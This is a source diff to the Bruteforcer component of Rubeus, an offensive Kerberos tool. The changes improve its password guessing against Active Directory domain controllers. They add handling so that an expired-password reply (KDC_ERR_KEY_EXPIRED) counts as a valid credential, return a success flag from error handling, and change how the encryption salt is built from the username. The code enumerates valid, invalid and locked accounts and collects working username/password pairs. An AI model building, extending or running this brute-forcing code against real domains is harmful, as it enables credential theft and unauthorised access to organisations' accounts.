@@ -3,21 +3,20 @@ using System.Collections.Generic;
 
 namespace Rubeus
 {
+
     public interface IBruteforcerReporter
     {
-        void ReportValidPassword(string domain, string username, string password, byte[] ticket);
-
+        void ReportValidPassword(string domain, string username, string password, byte[] ticket, Interop.KERBEROS_ERROR err = Interop.KERBEROS_ERROR.KDC_ERR_NONE);
         void ReportValidUser(string domain, string username);
-
         void ReportInvalidUser(string domain, string username);
-
         void ReportBlockedUser(string domain, string username);
-
         void ReportKrbError(string domain, string username, KRB_ERROR krbError);
     }
 
+
     public class Bruteforcer
     {
+
         private string domain;
         private string dc;
         private IBruteforcerReporter reporter;
@@ -64,7 +63,7 @@ namespace Rubeus
             }
             catch (KerberosErrorException ex)
             {
-                this.HandleKerberosError(ex, username);
+                return this.HandleKerberosError(ex, username, password);
             }
 
             return false;
@@ -73,7 +72,7 @@ namespace Rubeus
         private void GetUsernamePasswordTGT(string username, string password)
         {
             Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
-            string salt = String.Format("{0}{1}", domain.ToUpper(), username.ToLower());
+            string salt = String.Format("{0}{1}", domain.ToUpper(), username);
 
             // special case for computer account salts
             if (username.EndsWith("$"))
@@ -90,42 +89,47 @@ namespace Rubeus
             this.ReportValidPassword(username, password, TGT);
         }
 
-        private void HandleKerberosError(KerberosErrorException ex, string username)
+        private bool HandleKerberosError(KerberosErrorException ex, string username, string password)
         {
+
+
             KRB_ERROR krbError = ex.krbError;
+            bool ret = false;
 
             switch ((Interop.KERBEROS_ERROR)krbError.error_code)
             {
                 case Interop.KERBEROS_ERROR.KDC_ERR_PREAUTH_FAILED:
                     this.ReportValidUser(username);
                     break;
-
                 case Interop.KERBEROS_ERROR.KDC_ERR_C_PRINCIPAL_UNKNOWN:
                     this.ReportInvalidUser(username);
                     break;
-
                 case Interop.KERBEROS_ERROR.KDC_ERR_CLIENT_REVOKED:
                     this.ReportBlockedUser(username);
                     break;
-
                 case Interop.KERBEROS_ERROR.KDC_ERR_ETYPE_NOTSUPP:
                     this.ReportInvalidEncryptionType(username, krbError);
                     break;
-
+                case Interop.KERBEROS_ERROR.KDC_ERR_KEY_EXPIRED:
+                    this.ReportValidPassword(username, password, null, (Interop.KERBEROS_ERROR)krbError.error_code);
+                    ret = true;
+                    break;
                 default:
                     this.ReportKrbError(username, krbError);
                     throw ex;
             }
+            return ret;
         }
 
-        private void ReportValidPassword(string username, string password, byte[] ticket)
+        private void ReportValidPassword(string username, string password, byte[] ticket, Interop.KERBEROS_ERROR err = Interop.KERBEROS_ERROR.KDC_ERR_NONE)
         {
+
             validCredentials.Add(username, password);
             if (!validUsers.ContainsKey(username))
             {
                 validUsers.Add(username, true);
             }
-            this.reporter.ReportValidPassword(this.domain, username, password, ticket);
+            this.reporter.ReportValidPassword(this.domain, username, password, ticket, err);
         }
 
         private void ReportValidUser(string username)
@@ -168,5 +172,6 @@ namespace Rubeus
         {
             this.reporter.ReportKrbError(this.domain, username, krbError);
         }
+
     }
 }
